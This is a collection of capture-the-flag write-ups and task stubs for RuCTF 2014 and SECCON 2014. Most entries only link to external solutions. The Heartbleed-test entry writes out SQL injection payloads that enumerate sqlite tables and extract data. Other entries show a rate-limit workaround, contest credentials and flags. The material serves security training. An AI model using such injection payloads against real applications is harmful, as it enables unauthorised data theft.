> Сould name the city where her camera was stolen.

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-recon-200/>
* <https://ctfcrew.org/writeup/43>
* [Japanese](http://xrekkusu.hatenablog.jp/entry/2014/03/11/143840)
* <http://singularityctf.blogspot.jp/2014/03/ructf-quals-2014-writeup-recon-200_19.html>
* <http://logic.stypr.com/ctf/2014/RuCTF_solutions.zip>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-200.html)
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-recon-200-stolen-camera/>
# RuCTF 2014 Quals: Recon 300 - [Text me](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/text_me)

> Have you ever met Olimpiada Balalaykina?
> She is a young girl who likes to chat and dreams to meet Pavel Durov.
> Somebody is telegraphing her strange messages with secret password. Could you find that?
> Flag format is "RUCTF\_.\*"

## Writeup

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/03/ructf-quals-2014-vuln100-and-recon300-writeup/>
* <http://h34dump.com/2014/03/933/>
* <http://onthesystemsoftheworld.blogspot.in/2014/03/ructf-2014-qualifiers-recon-100300400.html>
* <https://ctfcrew.org/writeup/46>
* <http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-300-get_19.html>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-300-get.html)
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-recon-300-get-the-message/>
# RuCTF 2014 Quals: Recon 400 - [Property Owner](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/property\_owner)

> Have you ever met Olimpiada Balalaykina?
> She is a young girl who likes to chat and dreams to meet Pavel Durov.
> Could name her landlord's name.

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/940/>
* <http://onthesystemsoftheworld.blogspot.in/2014/03/ructf-2014-qualifiers-recon-100300400.html>
* <https://ctfcrew.org/writeup/41>
* <http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-400_19.html>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-400.html)
* <https://hackucf.org/blog/recon-400/>
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-recon-400-landlord/>
# RuCTF 2014 Quals: Recon 500 - [Bad Ass Card](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/bad_ass_card)

> Have you ever met Olimpiada Balalaykina?
> She is a young girl who likes to chat and dreams to meet Pavel Durov.
> And what about her bad ass friend? Could you get his credit card number?

## Writeup

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/44>
* <http://singularityctf.blogspot.jp/2014/03/ructf-quals-2014-writeup-recon-500-card_19.html>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-500-card.html)
# RuCTF 2014 Quals: Reverse 10 - [Harm](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/harm)

> It sure should be a no problem for you to find an md5 digest of ragger.hsc file from harm0597 discmag.

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-reverse-10/>
# RuCTF 2014 Quals: Reverse 100 - [Backdoor Crypto](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/backdoor_crypto)

> Something wrong with [this](main.asm) library source file. Decrypt our message about Hackerdom please (we used ECB for encrypt):
> de540a2994f1ee070053ee470b83b3230b59dc0fd4916dc85ca060cb1ab345cc40425206ca78be0cc0d5b1f8afc241f41c95784d178c20eb7e8d502c81e54f891d1280206150eda0a3a2eeea6fd3771d2d93df5d3b9750452d606a914b745ec46b6460d7aad7aee7276ba69db7166e19356c8aba3ec272a4d7f679294333f4f5591277a3e951ad6026ca42d6c51bea63d3d3e1599129367de64ee38afec0d219
> Answer starts with RUCTF\_

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Reverse 200 - [No Harm](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/no_harm)

> ... but it may be a little bit harder to find an md5 digest of the biggest file from harm.dat of harm0597 discmag.

## Writeup

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/52>
# RuCTF 2014 Quals: Reverse 300 - [Erl](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/erl)

> [Crack me](r.beam)
> Flag format is "RUCTF\_.\*)

## Other write-ups and resources

* [Japanese](http://d.hatena.ne.jp/kusano_k/20140310)
# RuCTF 2014 Quals: Reverse 400 - [Keyboard Interrupter](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/keyboard_interrupter)

> [Guess pin code](main.45c1ec963414c50855bcb1172dd808d2). Length of pin code is not more than 12 chars.

## Other write-ups and resources

* <https://ctfcrew.org/writeup/53>
* [Japanese](http://d.hatena.ne.jp/kusano_k/20140310)
# RuCTF 2014 Quals: Reverse 500 - [Arcfour](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/arcfour)

> [Crack me](arcfour.zip) please.
> Flag format is "RUCTF\_.\*"

## Writeup

(TODO)

## Other write-ups and resources

* <http://piggybird.net/2014/03/ructf-2014-quals-reverse-500-arcfour/>
* <https://ctfcrew.org/writeup/47>
# RuCTF 2014 Quals: Stegano 100 - [Gif lsb](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/gif_lsb)

> [Find the key](task.gif).
> Format is "RUCTF\_.\*"

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-stegano-100/>
* <http://nullify-ctf.blogspot.in/2014/03/ructf-quals-2014-stegano-100-cats-eye.html>
* <https://ctfcrew.org/writeup/51>
* <http://www.tsg.ne.jp/nolze/blog/RuCTF_Quals_2014.html#stegano-100-cats-eye>
* <http://quangntenemy.blogspot.de/2014/03/ructf-quals-2014.html>
# RuCTF 2014 Quals: Stegano 200 - [Audio Sub](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/audio_sub)

> [What does he say?](Stegano200.wav)

## Other write-ups and resources

* <https://stratum0.org/blog/posts/2014/03/10/ructf-quals-2014-HP/>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-stegano-200-hp.html)
# RuCTF 2014 Quals: Stegano 300 - [Palette Code](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/palette_code)

> We think that [this image](nyan-task.png) contains some hidden message, but our expert founded nothing unusual in it. Maybe you will find something?
> Flag format is "RUCTF\_.\*"

## Other write-ups and resources

* <http://lights-out-ctf.ghost.io/ructf-2014-quals-stegano-300-nyan-task/>
* <http://quangntenemy.blogspot.de/2014/03/ructf-quals-2014.html>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-stegano-300.html)
# RuCTF 2014 Quals: Stegano 400 - [Long Video](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/long_video)

> [Very strange video](https://github.com/HackerDom/ructf-2014-quals/blob/master/tasks/long_video/static/video.4543841d275178bcfa3eab00a2337ba6.7z).

## Other write-ups and resources

* <http://delimitry.blogspot.de/2014/03/ructf-quals-2014-stegano-400-writeup.html>
# RuCTF 2014 Quals: Stegano 500 - [Echo](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/echo)

> Don't expect anything original from [an echo](http://echo.quals.ructf.org:8000/echo.ogg). Формат флага — "RUCTF\_.\*"

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Vuln 100 - [Guess](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/guess)

> vuln1.quals.ructf.org:16712 [binary](guess)
> Flag format is “RUCTF\_.\*”.

## Writeup

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/03/ructf-quals-2014-vuln100-and-recon300-writeup/>
* <http://h34dump.com/2014/03/ructf-quals-2014-vuln-100/>
* <http://blog.0xdeffbeef.com/2014/03/ructf-quals-2014-guess-flag-vuln-100.html>
* <https://ctfcrew.org/writeup/45>
# RuCTF 2014 Quals: Vuln 200 - [Aggregator](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/aggregator)

> vuln1.quals.ructf.org:16711
> [binary](aggregator)
> Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* <http://v0ids3curity.blogspot.in/2014/03/ructf-quals-2014-aggregator-vuln-200.html>
# RuCTF 2014 Quals: Vuln 300 - [Qwer](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/qwer)

> Awesome post service -- ssh vuln2.quals.ructf.org -p 2022 user:Ikiy7ei5

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-vuln-300/>
* <http://blog.0xdeffbeef.com/2014/03/ructf-quals-2014-posts-vuln-300-write-up.html>
# RuCTF 2014 Quals: Vuln 400 - [Quest](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/quest)

> telnet://vuln1.quals.ructf.org:16710
> [binary](quest)
> Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Vuln 500 - [Mixer](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/mixer)

> This [binary](mixer) works on <http://echo.quals.ructf.org/>.
> Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Web 100 - [PHP](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/php)

> [Find the key](http://w1.quals.ructf.org/).

## Writeup

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/03/ructf-quals-2014-web100-and-web200-writeup/>
* <http://nullify-ctf.blogspot.in/2014/03/ructf-quals-2014-web-100-php.html>
* <http://www.suslopas.pw/2014/03/ructf-web-100-php.html>
# RuCTF 2014 Quals: Web 200 - [ES](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/es)

> [Find the key](http://w2.quals.ructf.org/).

## Writeup

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/03/ructf-quals-2014-web100-and-web200-writeup/>
* <https://hackucf.org/blog/wp-content/uploads/RuCTF-2014_Web200_Knightsec.pdf>, PDF
* <https://ctfcrew.org/writeup/48>
* [Japanese](http://d.hatena.ne.jp/kusano_k/20140310)
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-web-200-es-2/>
# RuCTF 2014 Quals: Web 300 - [mssngrrr](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/mssngrrr)

> We got Secure ID of Agent Dick Gill — d69e5ccddeed4c2a85fceea286e521fe. [Let's send](http://mssngrrr.quals.ructf.org/) him an International Women's Day gift message ;)
> Auth: %TEAM%:%HASH%

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-web-300/>
* [Japanese](http://mage-ctf-writeup.blogspot.jp/2014/03/ructf-quals-2014-web300.html)
* <http://www.tsg.ne.jp/nolze/blog/RuCTF_Quals_2014.html#web-300-messengerrr>
* <http://akaminsky.net/plaidctf-quals-2014-web-300-whatscat/>
# RuCTF 2014 Quals: Web 400 - [IRRSA](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/irrsa)

> Hi! We have unconfirmed information about our agent and developer of [our site](http://irrsa.quals.ructf.org/). His tasks includes processing requests from civilians. We think that he is double agent and works for irRational Security Agency. Help us to find evidence about that.
> Auth: %TEAM%:%HASH%
> Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* <https://rdot.org/forum/showthread.php?t=3053&langid=1>
* <https://github.com/dscheg/ructf-2014-quals-web400-writeup/>
* <http://ahack.ru/write-ups/ructf-quals-14.htm>
# RuCTF 2014 Quals: Web 500 - [OAUTH](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/oauth)

> [Read](http://secritter.quals.ructf.org) my private messages.. @root.

## Other write-ups and resources

* none yet
# RuCTFE 2014: Glass

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2014: Heart

## Write-up

(TODO)

## Other write-ups and resources

* <http://h4des.org/blog/index.php?/archives/348-RuCTFe-2014-heart-write-up.html>
# RuCTFE 2014: ISS

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2014: Jetpack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2014: Pidometer

## Write-up

(TODO)

## Other write-ups and resources

* <https://ben-stock.de/2014/12/ructfe-2014-write-up-pidometer/>
# RuCTFE 2014 write-ups

* <http://ructf.org/e/2014/>
* [Scoreboard](http://monitor.e.ructf.org/) or [local alternative](scoreboard.txt)
* [Vulnerable Image](http://ructf.org/e/2014/RuCTFE2014.torrent), password e328df42bfeda24e6b36f60c4b83deb4

## Info

RuCTFE is an annual online international challenge in information security. It has been held 5 times already.

The contest is driven by classic rules. Each team is given a set of vulnerable services. Organizers regulary fill services with private information — the flags. The goal of each team is to find vulnerabilities, fix them in their services and exploit them in order to get flags from other teams. Please refer to [the rules page](http://ructf.org/e/2014/rules) for slightly more info.

All flags match this regular expression: `/^\w{31}=$/`.

## Completed write-ups

* none yet

## External write-ups only

* [Heart](heart)
* [Pidometer](pidometer)

## Missing write-ups

* [Glass](glass)
* [ISS](iss)
* [Jetpack](jetpack)
* [VoiceBox](voicebox)
* [VWS](vws)
# RuCTFE 2014: VoiceBox

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2014: VWS

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SECCON CTF 2014: Advanced RISC Machine

**Category:** Exploit
**Points:** 300
**Description:**

> Read `flag.txt`.
>
> <http://micro.pwn.seccon.jp/arm/>

## Write-up

The website displays:

> Advanced RISC Machine
>
> Running [this program](passcheck-arm) on port 10001.

(TODO)

## Other write-ups and resources

* <http://lovelydream.gitcafe.com/2014/12/08/seccon/#Exploitation_300_arm>
* <https://rzhou.org/~ricky/seccon2014/arm/test.py>
* <http://pastebin.com/63GHE3Nu>
# SECCON CTF 2014: BBQR

**Category:** QR
**Points:** 400
**Description:**

> Let’s enjoy BBQR!
>
> ![](IMG_20141130_105047_s.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SECCON CTF 2014: Binary Karuta

**Category:** Web
**Points:** 400
**Description:**

> <http://binkaruta.pwn.seccon.jp/binkaruta/>

## Write-up

In Binary Karuta, the point is to correctly identify the CPU architecture of the binary hex dump displayed. If you wait over 60 seconds, it will time out and you will have to start again. You need to guess the correct CPU architecture 100 times in order to get the flag. There are no tricks to this. This game is to determine how well you are are reading binary hex with your eyes! There are around 35 different architectures being used for this so it will be good practice for you to get familiar with exotic binary.

### Exploration

Loading up the website shows a screen where an `xxd`-formatted string is shown of what is presumed to be a subset of some binary. Underneath there are seven architectures listed. Clicking one returns whether or not your response was correct and loads the next question. Sometimes there is a rate limit where you must wait 60 seconds before you can interact with the server again. Quick analysis suggests that you are rate limited based on IP address, not session.

### API

The JavaScript on the page suggests that there is one API endpoint to both get the question and answer a question. The state of which problem you are responding to is stored in the browser’s cookies. The two actions on the end point are as follows:

#### Get question

```bash
$ curl 'http://binkaruta.pwn.seccon.jp/cgi-bin/q.cgi'
m68k,m32r,mcore,mmix,i386,mips16,h8300,Bgkii/9G+hSoFCBUcHkD/3QJN230bfVt9m/wABANFg0lb3QAlA0jGwN5AgD/HSNDCHkAAAFa/hZuDURGInkCABAZEW9wABBe/hRIeQIAEBkRb3AAEIgQkABe/hRIQCB5AgAQDUFvcAAQXv4UGnkCABANQW9wABCIEJAAXv4UGg10jBKUAHkCAIAZEQ1AXv4USA1SDWENQF7+FBoNUUwEC4ELARGBEwkRgRMJb/EABg1S6gPiAA0iRwgNEgsCb/IABnkCALB5ARt8b3AAEIggkABe/hQaGTNv8wAOb/MADBlVGWZ5AgAsb3MABh0jTwwNMgkiCSNv8wAKQAh5AgCEbw==,0,0
```

The first seven values are the list of possible architectures for the binary. The next value is a base64-encoded string of the subset of the binary.

#### Answer Question

```python
import requests
cookies = {}

# Answer is a 1-based index of the list of possible architectures given with the question.
# It is assumed that the server pulls the question out of the session.
url = 'http://binkaruta.pwn.seccon.jp/cgi-bin/q.cgi'
resp = requests.post(url, cookies=cookies, data={ 'A': 1 })
print resp.text
# => arm,mips16,m6811,avr,mmix,sh64,v850,AQ8iDQ0B4wFaUeYBJl4iDQ0BOwINDj8BDRLADQIBIg0NDMgBDf3KAgz9wAEBAiIBARgiDg4B4wLHquYC6bYiDg4COwIOFD8BDgzADgIBIg4ODcgBDgzKAg0MwAEBAiIBARYi/f0B4wEQXeYB1i8i/f0BOwL9BT8B/RvA/QIBIv39DsgB/Q3KAg4NwAEBAiIBAQoiDAwB4wIUU+YCAkQiDAwCOwIMCT8BDBfADAIBIgwM/cgBDA7KAv0OwAEBAiIBAQgiDQ0B4wHmgeYB2KEiDQ0BOwINDj8BDRLADQIBIg0NDMgBDf3KAgz9wAEBAiIBARQiDg4B4wL7yOYC59MiDg==,3,0
```

The thing to note is that when you answer a question, whether you’re right or wrong, it sends you the next question. Also, it’s important to note the last two values: the `3` is the correct response for the previous question answered; the `0` is the number of consecutive correct responses you’ve given.

### Solution

I solved this problem by building a **Naive Bayes Classifier** to give me the probability that the binary belongs to any given architecture.
To do this I needed two things:

1. ***A dataset of binaries and their correct architectures***
2. ***A function that turns a binary into a set of features***

#### Scraping data

The thing to note from the API is that regardless of whether or not you guess the correct response, you get the correct answer to the problem.
This is a goldmine for scraping.
This means while playing the game, if your classifier guesses incorrectly, you can still get the correct response and log it for future training.
You can find my code to do this in [`solve.py`](solve.py).

#### Building features

My strategy was to first take the unique set of all non-overlapping 64-bit sequences in all the binaries. Then for a given binary, for all 64-bit sequences, list whether or not the binary contains the sequence (regardless of whether they overlap). The idea was that opcode formats are somewhat unique across architectures and that there should be a mapping from 64-bit sequences to opcode formats. I never validated this assumption beyond the fact that it seemed to work. The actual code for this is in [`solve.py`](solve.py), but the pseudocode is something like this:

```
for word in all_words:
  features['contains(%s)' % word] = (word in binary)
```

#### Training the model

The implementation of Naive Bayes I used was provided by [NLTK](http://www.nltk.org/). The API is extremely simple.

```python
labelled_data = [(compute_features(binary), architecture)
                  for binary, architecture in data]
classifier = nltk.NaiveBayesClassifier.train(labelled_data)

print classifer.classify(compute_features(new_binary))
# => architecture
```

### The script

To automate this process I had a script that would automatically flip flop between playing the game, collecting data, and retraining the classifier. After every 500 guesses, I would stop, retrain the classifier on the complete dataset, then use that in the scraper to try to guess the correct response. Every time I retrained the model, I would cross-validate to make sure that the predictive power of my model was in fact increasing with more data. If the predictive power of my model went down with more data, that would be a sign of a bad feature vector. Luckily that didn’t happen.

### Bootstrapping a dataset

Unfortunately due to rate limiting, I can’t just run this script with no data. Every time you guess an incorrect answer, the server will rate limit you for 60 seconds. However, if you simply hit the server with a fresh session and never send the server any data, you’ll almost never be rate limited.
We can use this to our advantage to bootstrap a dataset. Since we’re given seven possible architectures for the given binary, we know that at least one is correct. We can feed in every architecture into the classifier as a valid example for the given binary to create an approximate classifier.

The beauty of a Naive Bayes Classifier is that if your feature vector does in fact exhibit a unique pattern for a given architecture, the false examples won’t receive much weight because they won’t exhibit any statistical patterns unique from one another. I actually bootstrapped a decent classifier by scraping 7000 samples, 1000 of which were accurate. You can see my code to bootstrap the dataset in `bootstrap.py`.

#### Increasing predictiveness of the model

Since the server actually provides you a list of seven possible architectures for the binary, you can increase the predictive power of the model pretty easily. Instead of just using the `classify()` function, you can use the `prob_classify()` to get a list of the likelihood the binary belongs to each architecture. You can then just take the maximum of the intersection of the two sets.

### Flag

After running the script with bootstrapped data for a while, then trimming out the false data from the training set I had a classifier that was accurate enough to correctly guess the binary 170 times in a row. On the 100th consequtive request an addition field is returned. That field is the flag.

```
SECCON{EnjOy_KaRUtA}
```

## Other write-ups and resources

* none yet
# SECCON CTF 2014: Bleeding “Heartbleed” Test Web

**Category:** Web
**Points:** 300
**Description:**

> <http://bleeding.pwn.seccon.jp/>

## Write-up

The link points to a service that allows you to enter an IP address and a port number. The correspondingserver is then tested for the Heartbleed vulnerability.

Entering a random IP address (in this case, `173.194.65.100`, one of Google’s IPs) and port 443 results in the URL `http://bleeding.pwn.seccon.jp/?ip=173.194.65.100&port=443`, which displays the test results:

> ```
> Connecting...
> Sending Client Hello...
> Waiting for Server Hello...
>  ... received message: type = 22, ver = 0302, length = 61
>  ... received message: type = 22, ver = 0302, length = 3852
>  ... received message: type = 22, ver = 0302, length = 331
>  ... received message: type = 22, ver = 0302, length = 4
> Sending heartbeat request...
> ```

Below the test results, there is a disclaimer:

> We put test results into our database for analysis. Thank you for your understanding.

A-ha… Could this be a SQL injection challenge?

The HTML source code contains a comment:

```html
<!-- DEBUG: INSERT OK. TIME=1417889356 -->
```

This indicates that the server performs an `INSERT` query.

First, we need to set up a server that is vulnerable to Heartbleed, and that ‘bleeds’/leaks a payload under our control. Luckily, [PPP has already written a script doing just that for PlaidCTF](https://github.com/pwning/plaidctf2014/blob/master/web/heartbleed/Makefile). After some small tweaks to make it read the Heartbleed payload from a file (`/tmp/heartpayload`) at run-time rather than from a hardcoded string at compile-time, we end up with [`Makefile`](Makefile). Insert your server’s IP address at the top of the file, and then run:

```bash
$ make clean && make && ./heartbleed.sh
```

Entering your server details on the web page then takes you to <http://bleeding.pwn.seccon.jp/?ip=$your_server_ip&port=443>. By editing the `/tmp/heartpayload` file on our server and then reloading the above page, we can easily test different payloads.

Using just a single quote (`'`) as the payload results in the following error message:

> DATABASE ERROR!!! near ".": syntax error
>
> ```sql
> select time from results where result='Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0302, length = 66 ... received message: type = 22, ver = 0302, length = 839 ... received message: type = 22, ver = 0302, length = 331 ... received message: type = 22, ver = 0302, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0302, length = 16384 Received heartbeat response: .@.'...... WARNING: server returned more data than it should - server is vulnerable! ';
> ```

It seems the server executes the abovementioned `INSERT` query, followed by a `SELECT` query just to fetch the matching timestamp that is displayed in the HTML comment.

After some attempts we realize we can override the timestamp value by using a payload like this:

```
' UNION SELECT 1337 WHERE 1=1 OR '1' LIKE '
```

The `1337` part of that payload is reflected in the HTML comment:

```html
<!-- DEBUG: INSERT OK. TIME=1337 -->
```

Since it seems to be a sqlite database, let’s try to figure out the table names:

```
' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table';--
```

The result:

```html
<!-- DEBUG: INSERT OK. TIME=results,ssFLGss,ttDMYtt -->
```

So there are three tables: `results`, `ssFLGss`, and `ttDMYtt`. That second one seems interesting. Eventually we end up with this final payload:

```
' UNION SELECT flag from ssFLGss WHERE 1=1 OR '1' LIKE '
```

And the result:

```
<!-- DEBUG: INSERT OK. TIME=SECCON{IknewIt!SQLiteAgain!!!} -->
```

The flag is `SECCON{IknewIt!SQLiteAgain!!!}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/seccon-ctf-2014-online-qualifications-web300-writeup/>
* <http://lovelydream.gitcafe.com/2014/12/08/seccon/#Web_300_Heartbleed>
* <https://github.com/S42X/CTF/blob/master/SECCON/Bleeding_Heartbleed.md>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/w300-bleeding-heartbleed-test-web/)
* [Thai Video](https://www.youtube.com/watch?v=AmcWJSr-4C8)
# SECCON CTF 2014: Choose the number

**Category:** Programming
**Points:** 100
**Description:**

> ```bash
> nc number.quals.seccon.jp 31337
> ```

## Write-up

This service gives you a list of numbers, and then asks for either the lowest or the highest of those numbers. If you enter the correct answer, the next challenge appears.

```bash
$ nc number.quals.seccon.jp 31337
0, 7, -3
The maximum number? 7
6, 0, -3, -2
The maximum number? 6
-8, 3, 0, 6, 4
The minimum number? -8
2, 0, -8, 2, 5, 2
The maximum number?
```

We wrote [a Python script to automate this](solve.py), and let it run for a while. After answering 100 challenges correctly, the flag is revealed:

```
 -4221710437, -1740702929, 4270517397, 3209397296, 3762024025, -3672989483, -775093555, 4151733183, 3564119176, -2899783113, -3331662677, 642770555, -3121798555, 1288976181, -3587672601, 2905985917, 2137540564, 1172635558, -1479609079, -1248372983, 3873677181, 1248052749, -1034576168, 2036474576, -253149619, -2392684096, -1930807573, -2317594216, 929234744, -1670667531, -1628006672, 879994792, 1969573571, -1305518363, -1355550455, 1095362934, -124373352, -1807675908, 3878897952, -1837056383, -2612347417, -1268914355, 4050965082, 1631467597, 2186132639, -2873319762, 2416444358, 3467519746, 1294589509, 690827023, -1648894301, 3245051371, -4125602438, 2445841557, -47857822, -148422805, 1594344784, -2702599035, -2113258438, 439412574, -3648358307, 701139315, 2674841307, -276835850, 2008480906, -742379070, -854097465, 2338492179, 653621662, 3204170814, -4292552234, -592497316, -2541019100, -1497564068, -1732032680, 188766876, -2759314033, 1756911371, -2155898580, 1151212441, -2647634085, 3941284198, -1621905813, 3066978392, 2108513714, -2592441740, -2432239477, 582366717, 151030349, -3056239567, -3323966535, 3134812599, -2106237224, -3366016099, -3040745768, -959614841, 3068410499, -3895262470, 784215697, -2397024752, 2321915702
The maximum number?
>>> 4270517397
 Congratulations!
The flag is SECCON{Programming is so fun!}
```

The flag is `SECCON{Programming is so fun!}`.

## Other write-ups and resources

* <http://blogs.univ-poitiers.fr/e-laize/2014/12/07/seccon-2014-quals-prog-choose-number/>
* <https://github.com/S42X/CTF/blob/master/SECCON/ChooseTheNumber.md>
* <https://shankaraman.wordpress.com/2014/12/07/seccon-2014-writeups-networking-100-and-programming-100/>
* <http://icheernoom.blogspot.de/2014/12/seccon-ctf-2014-choose-number.html>
* <https://rzhou.org/~ricky/seccon2014/number/test.py>
* <https://github.com/rezk2ll/SECCON_2014_Programming100/blob/master/prog100.py>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/p100-choose-the-number/)
* [Indonesian](http://www.hasnydes.us/2014/12/choose-number-100pts-seccon-ctf-2014/)
# SECCON CTF 2014: Confused analyte

**Category:** Forensics
**Points:** 500
**Description:**

> Fill correct string in blackbox in IOC. (Input format is `SECCON{string}`.)
>
> ![](hoge.jpg)
>
> hoge.zip (pass:infected)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SECCON CTF 2014: Decrypt it (Easy)

**Category:** Crypto
**Points:** 200
**Description:**

> [`crypt1.zip`](crypt1.zip)

## Write-up

(TODO)

```bash
$ unzip crypt1.zip
Archive:  crypt1.zip
  inflating: ecrypt1.bin
  inflating: rnd
  inflating: readme.txt

$ cat readme.txt
./rnd crypt1.png ecrypt1.bin

$ file rnd
rnd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

## Other write-ups and resources

* <http://tasteless.eu/2014/12/seccon-quals-2014-decrypt-it-easy-crypto200/>
* <http://blogs.univ-poitiers.fr/e-laize/2014/12/08/seccon-2014-quals-crypto-decrypt-it/>
# SECCON CTF 2014: Decrypt it (Hard)

**Category:** Crypto
**Points:** 300
**Description:**

> ```
> g^k=69219086192344
> 20<k<20000
> ```
>
> [`c2.zip`](c2.zip)

## Write-up

(TODO)

```bash
$ unzip c2.zip
Archive:  c2.zip
   creating: crypt2/
  inflating: crypt2/E
  inflating: crypt2/eflag.bin
  inflating: crypt2/readme.txt

$ cat crypt2/readme.txt
./E 1 69219086192344 flag.png eflag.bin

$ file crypt2/E
crypt2/E: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

## Other write-ups and resources

* none yet
# SECCON CTF 2014: Easy Cipher

**Category:** Crypto
**Points:** 100
**Description:**

> ```
> 87 101 108 1100011 0157 6d 0145 040 116 0157 100000 0164 104 1100101 32 0123 69 67 0103 1001111 1001110 040 062 060 49 064 100000 0157 110 6c 0151 1101110 101 040 0103 1010100 70 101110 0124 1101000 101 100000 1010011 1000101 67 0103 4f 4e 100000 105 1110011 040 116 1101000 0145 040 1100010 0151 103 103 0145 1110011 0164 100000 1101000 0141 99 6b 1100101 0162 32 0143 111 1101110 1110100 101 0163 0164 040 0151 0156 040 74 0141 1110000 1100001 0156 056 4f 0157 0160 115 44 040 0171 1101111 117 100000 1110111 0141 0156 1110100 32 0164 6f 32 6b 1101110 1101111 1110111 100000 0164 1101000 0145 040 0146 6c 97 1100111 2c 100000 0144 111 110 100111 116 100000 1111001 6f 117 63 0110 1100101 0162 0145 100000 1111001 111 117 100000 97 114 0145 46 1010011 0105 0103 67 79 1001110 123 87 110011 110001 67 110000 1001101 32 55 060 100000 110111 0110 110011 32 53 51 0103 0103 060 0116 040 5a 0117 73 0101 7d 1001000 0141 1110110 1100101 100000 102 0165 0156 33
> ```

## Write-up

The cipher is a list of numbers. Some of them are formatted as plain decimal numbers; others start with a leading `0` and are formatted as octals; some contain letters and are in fact hexadecimal digits; and others consist of 5 digits or more that are either `1` or `0`, in which case the number is formatted using binary notation.

By interpreting each number as described, you end up with a list of numbers, each of which represents a character by its Unicode code point. Turning the list of numbers into a string reveals the following plain text:

```
Welcome to the SECCON 2014 online CTF.The SECCON is the biggest hacker contest in Japan.Oops, you want to know the flag, don't you?Here you are.SECCON{W31C0M 70 7H3 53CC0N ZOIA}Have fun!
```

The flag is `SECCON{W31C0M 70 7H3 53CC0N ZOIA}`.

You can verify the flag using [this code](decrypt.py):

```bash
$ python decrypt.py ciphertxt
```

## Other write-ups and resources

* <http://yous.be/2014/12/09/seccon-ctf-2014-easy-cipher-write-up/>
* <https://github.com/S42X/CTF/blob/master/SECCON/EasyCipher.md>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/c100-easy-cipher/)
* [Indonesian](http://www.hasnydes.us/2014/12/easy-cipher-100pts-crypto-seccon-ctf-2014/)
# SECCON CTF 2014: Get from curious “FTP” server

**Category:** Network
**Points:** 300
**Description:**

> ftp://ftpsv.quals.seccon.jp/

## Write-up

```bash
$ ftp ftpsv.quals.seccon.jp
Connected to ftpsv.quals.seccon.jp.
220 (vsFTPd 2.3.5(SECCON Custom))
